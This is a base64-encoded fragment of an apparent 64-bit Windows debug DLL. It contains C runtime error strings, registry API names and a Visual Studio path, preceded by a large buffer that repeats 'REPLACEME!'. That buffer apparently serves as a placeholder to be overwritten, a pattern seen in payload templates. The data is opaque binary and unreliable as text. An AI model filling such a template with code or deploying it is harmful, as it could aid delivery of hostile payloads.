0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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